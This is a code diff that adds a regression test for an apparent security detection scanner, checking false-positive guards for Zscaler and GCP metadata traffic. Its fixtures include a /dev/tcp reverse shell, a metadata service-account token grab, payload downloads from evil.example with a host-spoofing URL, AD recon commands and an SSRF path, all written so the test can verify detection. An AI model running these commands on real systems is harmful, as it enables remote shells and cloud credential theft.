@@ -1223,3 +1223,97 @@ def test_seat1_2_4_audit_fixes_kerberoast_llm_allowlist_actor_rotation_padding_a
 
     parsed_cn = parse_auto(_write_jsonl(tmp_path / "aws_cn_single.jsonl", [aws_internal[0]]))
     assert len(parsed_cn) == 1 and parsed_cn[0]["appliance"] == "aws_cloudtrail"
+
+
+def test_live_crowdstrike_enterprise_fp_guards_zscaler_8890_and_gcp_metadata(tmp_path: Path) -> None:
+    """Permanent regression fixtures from live enterprise CrowdStrike Falcon Advanced Event Search validation."""
+    t = datetime(2026, 11, 22, 18, 30, 0, tzinfo=timezone.utc)
+
+    # 1. Zscaler Client Connector (ZSATunnel.exe) on TCP 8890 -> 0 FP,
+    #    while an unknown binary hitting TCP 8890 STILL fires agentic_default_port!
+    zscaler_8890 = [
+        {
+            "timestamp": _iso(t),
+            "source_host": "wkstn-sales-14",
+            "actor": "alice",
+            "surface": "network",
+            "process": r"C:\Program Files\Zscaler\ZSATunnel\ZSATunnel.exe",
+            "dest_host": "165.225.0.10",
+            "dest_port": 8890,
+            "status_code": 200,
+        }
+    ]
+    assert scan_telemetry_file(_write_jsonl(tmp_path / "zscaler_8890_benign.jsonl", zscaler_8890)) == []
+
+    evil_8890 = [{**zscaler_8890[0], "process": "/tmp/agent-worker", "dest_host": "198.51.100.77"}]
+    c_evil_8890 = scan_telemetry_file(_write_jsonl(tmp_path / "evil_8890.jsonl", evil_8890))
+    assert c_evil_8890 and "agentic_default_port" in c_evil_8890[0].reasons
+
+    # 2. Routine GCP metadata.google.internal zone/project probe from Java/Node -> 0 FP,
+    #    while credential/token harvesting OR inbound web SSRF to metadata.google.internal STILL alerts!
+    benign_gcp_probe = [
+        {
+            "timestamp": _iso(t),
+            "source_host": "gke-worker-04",
+            "actor": "appuser",
+            "surface": "endpoint",
+            "parent_process": "java",
+            "process": "/bin/sh",
+            "command_line": "wget -qO- --header='Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/zone",
+            "status_code": 200,
+        }
+    ]
+    assert scan_telemetry_file(_write_jsonl(tmp_path / "benign_gcp_zone.jsonl", benign_gcp_probe)) == []
+
+    evil_gcp_token = [
+        {
+            **benign_gcp_probe[0],
+            "command_line": "wget -qO- --header='Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        }
+    ]
+    c_gcp_tok = scan_telemetry_file(_write_jsonl(tmp_path / "evil_gcp_token.jsonl", evil_gcp_token))
+    assert c_gcp_tok and "web_ssrf_or_upload_webshell" in c_gcp_tok[0].reasons
+
+    # 2b. Chained RCE (/dev/tcp), AD/host recon (whoami && nltest), or external download alongside
+    #     benign metadata.google.internal MUST NOT be exempted from web_parent_shell_spawn!
+    for bypass_name, bypass_cmd in (
+        (
+            "chained_dev_tcp",
+            "sh -c \"wget -qO- http://metadata.google.internal/computeMetadata/v1/instance/zone >/dev/null; bash -i >& /dev/tcp/198.51.100.77/4444 0>&1\"",
+        ),
+        (
+            "chained_whoami_nltest",
+            "sh -c \"whoami && nltest /dclist:corp && curl -s http://metadata.google.internal/computeMetadata/v1/instance/zone\"",
+        ),
+        (
+            "multi_url_external",
+            "curl -s http://metadata.google.internal/computeMetadata/v1/instance/zone https://evil.example/payload.sh",
+        ),
+        (
+            "userinfo_host_spoof",
+            "curl -s http://metadata.google.internal@evil.example/payload.sh",
+        ),
+        (
+            "malformed_ipv6_url_fail_closed",
+            "curl -s http://[bad metadata.google.internal",
+        ),
+    ):
+        c_byp = scan_telemetry_file(
+            _write_jsonl(tmp_path / f"gcp_bypass_{bypass_name}.jsonl", [{**benign_gcp_probe[0], "command_line": bypass_cmd}])
+        )
+        assert c_byp and "web_parent_shell_spawn" in c_byp[0].reasons, f"Bypass {bypass_name} evaded web_parent_shell_spawn"
+
+    evil_web_ssrf = [
+        {
+            "timestamp": _iso(t),
+            "source_host": "198.51.100.55",
+            "actor": "198.51.100.55",
+            "surface": "web_portal",
+            "dest_host": "portal.corp.local",
+            "http_method": "GET",
+            "http_path": "/proxy?url=http://metadata.google.internal/computeMetadata/v1/",
+            "status_code": 200,
+        }
+    ]
+    c_web_ssrf = scan_telemetry_file(_write_jsonl(tmp_path / "evil_web_gcp_ssrf.jsonl", evil_web_ssrf))
+    assert c_web_ssrf and "web_ssrf_or_upload_webshell" in c_web_ssrf[0].reasons
